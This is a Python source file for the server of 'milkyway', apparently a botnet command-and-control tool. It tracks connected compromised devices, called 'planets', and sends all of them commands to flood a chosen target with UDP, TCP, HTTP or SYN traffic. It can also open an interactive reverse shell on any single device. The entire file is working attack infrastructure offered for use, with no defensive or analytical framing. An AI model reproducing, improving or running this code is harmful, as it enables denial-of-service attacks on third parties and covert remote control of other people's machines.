#!/usr/bin/env python3

"""galaxy.py: The milkyway server software."""

# import libraries
import os
from secrets import token_hex
import socket
import sys
import time
from re import sub
from threading import Thread
from signal import signal, SIGINT


# functions
class Utilities:
    """Provide some variables and utilities for generic tasks."""

    galaxy_online = False
    galaxy_os = ""
    galaxy_port = 9999

    def __init__(self):
        """Check platform of user, and begin listening for connections."""
        if sys.platform in ("linux", "linux2"):
            self.galaxy_os = "linux"
        elif sys.platform == "darwin":
            self.galaxy_os = "mac"
        elif sys.platform == "win32":
            self.galaxy_os = "windows"
        else:
            sys.exit("Unsupported platform.")
        while not self.galaxy_online:
            try:
                self.galaxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.galaxy_socket.bind(("0.0.0.0", self.galaxy_port))
                self.galaxy_socket.listen()
                self.galaxy_socket.settimeout(0.5)
                self.galaxy_online = True
            except OSError as e:
                if str(e) == "[Errno 98] Address already in use":
                    print(f"ERROR: Port {self.galaxy_port} is already in use. Retrying in 5 seconds...")
                    time.sleep(5)
                else:
                    raise e

    def exit_handler(self, *args):
        """Ensure a safe and smooth exit."""
        self.galaxy_online = False
        self.galaxy_socket.close()
        if "cmd" in args:
            print("| Exiting...")
        else:
            print("\nExiting...")
        os._exit(0)

    def clear(self):
        """Clear the screen."""
        if self.galaxy_os in ("linux", "mac"):
            os.system("/usr/bin/clear")
        elif self.galaxy_os == "windows":
            os.system("cls")


class PlanetHandler:
    """Handle remote devices."""

    planets: list[socket.socket]
    planets = []
    planet_ids: list[str]
    planet_ids = []
    planet_ips: list[tuple]
    planet_ips = []

    def remove_planet(self, planet):
        """Remove a remote planet."""
        planet_index = self.planets.index(planet)
        self.planets.remove(planet)
        del self.planet_ips[planet_index]
        del self.planet_ids[planet_index]
        if planet in ddos_handler.planets_attacking:
            ddos_handler.planets_attacking.remove(planet)
        if planet in shell_handler.planets_shelled:
            shell_handler.planets_shelled.remove(planet)

    def planet_thread(self, planet):
        """Handle messages from a remote device."""
        while utilities.galaxy_online:
            try:
                data = planet.recv(1024).decode("ascii").lower().strip()
                if not data:
                    break
                elif "offline" in data:
                    self.remove_planet(planet)
            except BrokenPipeError:
                self.remove_planet(planet)

    def planets_message(self, msg):
        """Send messages to all remote devices."""
        for planet in self.planets:
            try:
                planet.send(msg.encode())
            except BrokenPipeError:
                self.remove_planet(planet)

    def connection_handler(self):
        """Handle connections of remote devices."""
        while utilities.galaxy_online:
            try:
                planet, addr = utilities.galaxy_socket.accept()
                self.planets.append(planet)
                self.planet_ips.append(addr)
                planet_id = token_hex(10)
                self.planet_ids.append(planet_id)
                planet.send(f"planet ID: {planet_id}".encode())
                Thread(target=self.planet_thread, args=(planet, )).start()
            except TimeoutError:
                pass
            except OSError as e:
                if str(e) == "[Errno 9] Bad file descriptor":
                    break
                else:
                    raise e


class DDoSHandler:
    """Handle DDoS command."""

    planets_attacking: list[socket.socket]
    planets_attacking = []
    target_ip = ""
    target_port = 0
    flood_type = ""

    def start_attack(self):
        """Send attack command to all remote devices."""
        for planet in planet_handler.planets:
            try:
                planet.send(f"ddos {self.target_ip} {self.target_port} {self.flood_type}".encode())
                self.planets_attacking.append(planet)
            except BrokenPipeError:
                planet_handler.remove_planet(planet)
        print("| Attack successfully started.")

    def stop_attack(self):
        """Send stop attack command to all remote devices."""
        planets_attacking_old = self.planets_attacking
        for planet in planets_attacking_old:
            try:
                planet.send("ddos stop".encode())
                self.planets_attacking.remove(planet)
            except BrokenPipeError:
                planet_handler.remove_planet(planet)
        print("| Attack successfully stopped.")

    def check_target(self):
        """Check to see if target is online, and all target values entered are valid."""
        try:
            self.target_port = int(self.target_port)
        except ValueError:
            print("| ERROR: Invalid port. Please enter a valid number.")
            return False
        try:
            trimmed_ip = sub(r"htt.*.\/", "", self.target_ip).replace("www.", "")
            self.target_ip = socket.gethostbyname(trimmed_ip)
        except socket.gaierror:
            print("| ERROR: Invalid address. Please enter a valid domain or IPv4 address.")
            return False
        if self.flood_type == "udp":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif self.flood_type in ("tcp", "http"):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = socket.socket()
        try:
            s.connect((self.target_ip, self.target_port))
            s.close()
        except ConnectionRefusedError:
            print("| ERROR: Invalid port. Please enter an open port.")
            return False
        return True

    def ddos(self, cmd_ddos):
        """Initiate a DDoS attack using remote devices."""
        if not planet_handler.planets:
            print("| ERROR: There are no planets connected to attack with.")
            return
        if cmd_ddos != "ddos stop":
            split_cmd = cmd_ddos.strip().split()
            if len(split_cmd) < 4:
                print("| ERROR: One or more arguments not specified.")
                return
            elif len(split_cmd) > 4:
                print("| ERROR: Too many arguments specified.")
                return
            else:
                _, self.target_ip, self.target_port, self.flood_type = split_cmd
        else:
            self.stop_attack()
            return
        if self.flood_type not in ("udp", "tcp", "http", "syn"):
            print("| ERROR: Invalid attack type. Please enter a valid attack type.")
            return
        result = self.check_target()
        if result:
            self.start_attack()


class ShellHandler:
    """Handle shell command."""

    shell_online = False
    shell_port = 10000
    shell_planet = ""
    shelled_planet_cwd = ""
    planets_shelled: list[socket.socket]
    planets_shelled = []

    def __init__(self):
        """Bind socket and establish connection with planet."""
        while not self.shell_online:
            try:
                self.shell_socket = socket.socket()
                self.shell_socket.bind(("0.0.0.0", self.shell_port))
                self.shell_socket.listen()
                self.shell_socket.settimeout(0.5)
                self.shell_online = True
            except OSError as e:
                if str(e) == "[Errno 98] Address already in use":
                    print(f"| ERROR: Port {self.shell_port} is already in use. Retrying in 5 seconds...")
                    time.sleep(5)
                else:
                    raise e

    def init_shell_connection(self):
        """Accept planet connection and recieve CWD from planet."""
        while True:
            try:
                self.shell_planet, _ = self.shell_socket.accept()
                self.shelled_planet_cwd = self.shell_planet.recv(128 * 1024).decode()
                break
            except OSError as e:
                if "Bad file descriptor" in str(e):
                    self.shell_socket.close()
                    return
                else:
                    raise e

    def shell(self, cmd_shell):
        """Establish a reverse shell with a remote device."""
        new_cmd = cmd_shell.replace("shell ", "").strip().split()
        if len(new_cmd) > 1:
            print("| ERROR: Too many arguments specified.")
        elif len(new_cmd) == 0:
            print("| ERROR: No arguments specified.")
        else:
            shelled_planet_id = new_cmd[0]
        if shelled_planet_id not in planet_handler.planet_ids:
            print("| ERROR: The specified planet ID does not exist.")
            return
        shelled_planet = planet_handler.planets[planet_handler.planet_ids.index(shelled_planet_id)]
        shelled_planet.send("shell start".encode())
        self.init_shell_connection()
        utilities.clear()
        print(milkyway_logo)
        print("Type 'exit' to leave shell.")
        print("NOTE: Commands that require input will not work!\n")
        self.planets_shelled.append(shelled_planet)
        while shelled_planet in planet_handler.planets:
            shell_cmd = input(f"{shelled_planet_id} | {self.shelled_planet_cwd} > ")
            shell_cmd = f"{shell_cmd}"
            self.shell_planet.send(shell_cmd.encode())
            if shell_cmd.lower() == "exit":
                utilities.clear()
                print(milkyway_logo)
                print("Type 'help' for a list of commands.\n")
                break
            output = self.shell_planet.recv(128 * 1024).decode()
            result, self.shelled_planet_cwd = output.split("<sep>")
            print(result)
        if shelled_planet not in planet_handler.planets:
            utilities.clear()
            print(milkyway_logo)
            print("ERROR: Shelled planet is now offline.")
            print("Type 'help' for a list of commands.\n")
            return
        self.planets_shelled.remove(shelled_planet)


def command_help():
    """List all available commands."""
    print("| ddos <address> <port> <type>")
    print("| |-> Launches a DDoS attack using all connected planets.")
    print("| |-> Address must either be a domain, or an IPv4 address.")
    print("| |-> Types: tcp, http, udp, syn")
    print("| |-> 'ddos stop' will stop an in progress attack.")
    print("| shell <planet-id>")
    print("| |-> Opens a reverse shell on a the specified planet.")
    print("| |-> Commands that require input from the user will not work!")
    print("| list")
    print("| |-> Lists all connected planets.")
    print("| exit")
    print("| |-> Exits milkyway.")


def command_list():
    """List all connected planets."""
    if len(planet_handler.planets) > 0:
        print("| Connected planets:")
        for i, planet_ip in enumerate(planet_handler.planet_ips):
            planet_attacking = False
            planet_shelled = False
            planet_ip_list = list(planet_ip)
            planet_ip_port = f"{planet_ip_list[0]}:{planet_ip_list[1]}"
            list_planet = planet_handler.planets[i]
            if list_planet in ddos_handler.planets_attacking:
                planet_attacking = True
            if list_planet in shell_handler.planets_shelled:
                planet_shelled = True
            print(f"| {i + 1}. IP/Port: {planet_ip_port} | ID: {planet_handler.planet_ids[i]}")
            print(f"| |-> Attacking: {planet_attacking} | Shelled: {planet_shelled}")
    else:
        print("| There are no planets connected.")


# logo
milkyway_logo = """
||||||||||| ||||||||| |||       |||   ||| |||   ||| ||| ||| ||| ||||||||| |||   |||
||| ||| |||    |||    |||       ||||||    ||||||||| ||| ||| ||| |||   ||| |||||||||
||| ||| |||    |||    |||       |||   |||    |||    ||| ||| ||| |||||||||    |||
||| ||| ||| ||||||||| ||||||||| |||   |||    |||    ||||||||||| |||   |||    |||
"""

# initialize classes
utilities = Utilities()
planet_handler = PlanetHandler()
ddos_handler = DDoSHandler()
shell_handler = ShellHandler()

# exit handler
signal(SIGINT, utilities.exit_handler)

# handle connections
Thread(target=planet_handler.connection_handler).start()

# main stuff
utilities.clear()
print(milkyway_logo)
print("Type 'help' for a list of commands.\n")
while True:
    cmd = input("> ")
    if cmd == "help":
        command_help()
    elif cmd == "list":
        command_list()
    elif cmd == "exit":
        utilities.exit_handler("", "", "cmd")
    elif cmd[:5] == "ddos ":
        ddos_handler.ddos(cmd)
    elif cmd[:6] == "shell ":
        shell_handler.shell(cmd)
    else:
        print("| Invalid command.")
